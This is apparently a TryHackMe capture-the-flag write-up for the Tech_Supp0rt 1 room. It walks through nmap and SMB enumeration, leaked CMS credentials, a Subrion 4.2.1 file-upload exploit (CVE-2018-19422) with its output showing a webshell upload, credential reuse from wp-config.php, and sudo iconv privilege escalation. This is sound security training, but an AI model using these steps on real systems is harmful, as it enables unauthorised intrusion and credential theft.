
[TryHackMe Link](https://tryhackme.com/room/techsupp0rt1){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

<h4>Tasks:</h4>

- [x] What is the `root.txt` flag? 

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |
| <p id="p3" style="font-size:14px;  color: purple"></p>     | <p id="s3" style="font-size:14px; color: purple"></p>  |<p id="d3" style="font-size:14px; color: purple"></p> |
| <p id="p4" style="font-size:14px;  color: purple"></p>     | <p id="s4" style="font-size:14px; color: purple"></p>  |<p id="d4" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```s linenums="1" hl_lines="6 11 14 15 45"
    # Nmap 7.93 scan initiated Fri Feb 24 22:02:22 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.166.73
    Nmap scan report for 10.10.166.73
    Host is up (0.16s latency).
    Not shown: 996 closed tcp ports (reset)
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 108af572d7f97e14a5c54f9e978b3d58 (RSA)
    |   256 7f10f557413c71dbb55bdb75c976305c (ECDSA)
    |_  256 6b4c23506f36007ca67c1173c1a8600c (ED25519)
    80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=2/24%OT=22%CT=1%CU=39978%PV=Y%DS=5%DC=I%G=Y%TM=63F97A6
    OS:1%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS
    OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M
    OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68
    OS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
    OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
    OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
    OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
    OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
    OS:=40%CD=S)

    Network Distance: 5 hops
    Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: -1h50m00s, deviation: 3h10m31s, median: 0s
    | smb2-security-mode: 
    |   311: 
    |_    Message signing enabled but not required
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: techsupport
    |   NetBIOS computer name: TECHSUPPORT\x00
    |   Domain name: \x00
    |   FQDN: techsupport
    |_  System time: 2023-02-25T08:32:50+05:30
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-time: 
    |   date: 2023-02-25T03:02:52
    |_  start_date: N/A

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Feb 24 22:02:57 2023 -- 1 IP address (1 host up) scanned in 35.58 seconds

  ```

## <b>Enumeration</b>

At first, I accessed to the HTTP port on port 80, which led me to a default Apache webpage. 

<img id="image1" />

Then, I ran **dirsearch** to perform enumeration of the webserver's hidden directories, which yielded the following results.

```s linenums="1" hl_lines="25 26"
    Target: http://10.10.166.73/
    [22:06:17] Starting: 
    [22:06:24] 403 -  278B  - /.ht_wsr.txt                                     
    [22:06:24] 403 -  278B  - /.htaccess.bak1                                  
    [22:06:24] 403 -  278B  - /.htaccess.sample
    [22:06:24] 403 -  278B  - /.htaccess.save
    [22:06:24] 403 -  278B  - /.htaccess.orig
    [22:06:24] 403 -  278B  - /.htaccess_sc
    [22:06:24] 403 -  278B  - /.htaccess_extra
    [22:06:24] 403 -  278B  - /.htaccess_orig
    [22:06:24] 403 -  278B  - /.htaccessBAK
    [22:06:24] 403 -  278B  - /.htaccessOLD
    [22:06:24] 403 -  278B  - /.htaccessOLD2
    [22:06:24] 403 -  278B  - /.htm                                            
    [22:06:24] 403 -  278B  - /.html
    [22:06:24] 403 -  278B  - /.htpasswds
    [22:06:24] 403 -  278B  - /.httr-oauth
    [22:06:24] 403 -  278B  - /.htpasswd_test
    [22:06:26] 403 -  278B  - /.php                                            
    [22:06:58] 200 -   11KB - /index.html                                       
    [22:07:07] 200 -   94KB - /phpinfo.php                                      
    [22:07:11] 403 -  278B  - /server-status                                    
    [22:07:11] 403 -  278B  - /server-status/                                   
    [22:07:15] 301 -  313B  - /test  ->  http://10.10.166.73/test/             
    [22:07:15] 200 -   20KB - /test/                                            
    [22:07:19] 200 -    7KB - /wordpress/wp-login.php                           
                                                                                
    Task Completed  
```

Among the directories, the **/test** and **/wordpress** folders appeared to hold potential. Therefore, I explored both directories, one of which contained a suspicious-looking phishing page 

<img id="image2" />

while the other hosted the /wordpress theme featuring Teczilla.

<img id="image3" />

I enumerated even further with **/test** folder to find sub-folders. but wasn't lucky. So, I shifted my attention to the **SMB** protocols and ran smbclient tool to carry out enumeration. I encountered a **READ_ONLY** drive named `websvr`.

!!! tip "SMB Enumeration"

    ```s
    smbclient -L //10.10.166.73 
    ```

    ```s
    Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        websvr          Disk      
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
    ```

To access the share, I used the following command:

<img id="image4" />

Upon accessing the share, I got a text file that contained a hint regarding a hidden CMS folder located on the web server. 

```dtd linenums="1" hl_lines="4 10"
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:{--REDACTED--} [cooked with magical formula]
Wordpress creds
|->
```

While navigating to this directory, the page took an exceedingly long time to reload, causing me to lose hope. I decided to intercept the process and investigate what was occurring. To my surprise, the page redirected to a different location. When returning to the hint text file, I noticed that I have to visit **/subrion/panel** section.

## <b>Initial Access</b>

Now, I successfully located the CMS website. After determining the version number to be {== 4.2.1 ==}, I followed best practices by checking the database portal of searchsploit for any potential payloads and exploits. 

<img id="image5" />

I identified a possible RCE attack. Executing the following command led to my initial foothold on the webserver as `www-data` (a low-hanging fruit).

!!! danger "Arbitary File Upload"

    ```py
    python3 49876.py -u http://10.10.166.73/subrion/panel/ -l admin -p [REDACTED]

    [+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

    [+] Trying to connect to: http://10.10.166.73/subrion/panel/
    [+] Success!
    [+] Got CSRF token: LMx7pGnP4TA2tH67fVLEDShClIsmLu4rhKBjbIKY
    [+] Trying to log in...
    [+] Login Successful!

    [+] Generating random name for Webshell...
    [+] Generated webshell name: cosqtjuuaaeiyms

    [+] Trying to Upload Webshell..
    [+] Upload Success... Webshell path: http://10.10.166.73/subrion/panel/uploads/cosqtjuuaaeiyms.phar 
    ```

!!! note "Password Crack"
    <span>Note: You need to crack the password of admin using the magic function in CyberChef</span>

## <b>Privilege Escalation</b>

### <b>Gaining user access</b>

To elevate my access privileges, I attempted to establish a reverse shell from this point using the nc command. Unfortunately, my efforts didn't work well, and I was looking other alternatives.

At this point, I decided to enumerate the server's users further. I ran `/etc/passwd` and discovered the usernames.

```s linenums="1" hl_lines="30"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
mysql:x:111:119:MySQL Server,,,:/nonexistent:/bin/false

```

My attention then shifted to the wordpress directory, where I hoped to find some juicy information. To my delight, I found the database configuration file for Wordpress in the webserver folder.

```php linenums="1" hl_lines="26 29"
<?php 
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', '{--REDACTED--}' );

/** MySQL database password */
define( 'DB_PASSWORD', '{--REDACTED--}' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

!!! info "Pentesting Practice"
    <span>Typically, when you obtain some credentials, it's recommended to attempt to reuse them across all accessible services.</span>

By utilizing the obtained password for mysql, I reused to ssh on the `scam-site` user, and I was able to elevate my privileges.

### <b>Gaining root access</b>

From this point, the process became straightforward. I executed **linpeas.sh** to determine the current user's administrative powers. This was one of the following results:

<img id="image6" />

I then visited [gtfobins](https://gtfobins.github.io) to determine if any relevant entries existed. Once I identified the `iconv`, I executed the sudo command to gain root access.


<script>

// JSON object
const data = {
    "desc": "Hack into the scammer's under-development website to foil their plans.",
    "ip":  "10.10.166.73",
    "ports": "22/tcp,ssh,OpenSSH 7.2p2 Ubuntu 4ubuntu2.10;80/tcp,http,Apache httpd 2.4.18;139/tcp,netbios-ssn,Samba smbd 3.X - 4.X;445/tcp,netbios-ssn,Samba smbd 4.3.11-Ubuntu",
    "difficulty":"easy",
    "id": "5"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                console.log(ports[i])
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>